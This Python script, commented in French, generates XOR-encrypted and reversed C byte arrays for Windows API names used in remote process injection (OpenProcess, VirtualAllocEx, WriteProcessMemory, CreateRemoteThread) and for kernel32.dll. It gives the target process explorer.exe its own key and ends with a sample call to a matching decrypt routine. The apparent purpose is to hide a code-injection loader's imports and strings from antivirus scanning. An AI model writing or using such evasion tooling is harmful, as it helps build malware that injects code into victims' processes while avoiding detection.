#!/usr/bin/env python3
"""
Script pour générer des chaînes XOR chiffrées + reversées
Processus: Chaîne -> XOR encrypt -> Reverse -> Output C array
"""

def xor_encrypt(text, key=0x35):
    """Chiffre avec XOR"""
    encrypted = [ord(c) ^ key for c in text]
    return encrypted

def reverse_array(arr):
    """Reverse un tableau"""
    return arr[::-1]

def generate_c_array(name, text, key=0x35):
    """Génère un tableau C avec chiffrement XOR + reverse"""
    # Étape 1: XOR encryption (avec null terminator)
    encrypted = xor_encrypt(text + '\0', key)

    # Étape 2: Reverse
    reversed_encrypted = encrypted[-1:] + encrypted[-2::-1]

    # Génération du code C
    hex_values = ', '.join(f'0x{b:02x}' for b in reversed_encrypted)

    print(f"// Original: {text}")
    print(f"unsigned char encrypted{name}[] = {{")
    print(f"    {hex_values}")
    print(f"}};")
    print()

def main():
    print("// ========================================")
    print("// ENCRYPTED + REVERSED API STRINGS")
    print("// Key XOR: 0x35")
    print("// ========================================\n")

    # Windows API Functions
    api_functions = [
        ("VirtualAllocEx", "VirtualAllocEx"),
        ("OpenProcess", "OpenProcess"),
        ("VirtualProtectEx", "VirtualProtectEx"),
        ("WriteProcessMemory", "WriteProcessMemory"),
        ("CreateRemoteThread", "CreateRemoteThread"),
        ("GetModuleHandleA", "GetModuleHandleA"),
        ("GetProcAddress", "GetProcAddress"),
    ]

    # DLL names
    dll_names = [
        ("Kernel32", "kernel32.dll"),
    ]

    print("// === API Functions ===")
    for name, text in api_functions:
        generate_c_array(name, text, key=0x35)

    print("\n// === DLL Names ===")
    for name, text in dll_names:
        generate_c_array(name, text, key=0x35)

    # Process names (clé différente)
    print("\n// === Process Names (Key: 0x1b) ===")
    generate_c_array("explorer_exe", "explorer.exe", key=0x1b)

    print("\n// === Usage Example ===")
    print("// Pour déchiffrer:")
    print("// decrypt_reverse_xor(encryptedVirtualAllocEx, sizeof(encryptedVirtualAllocEx), 0x35);")

if __name__ == "__main__":
    main()
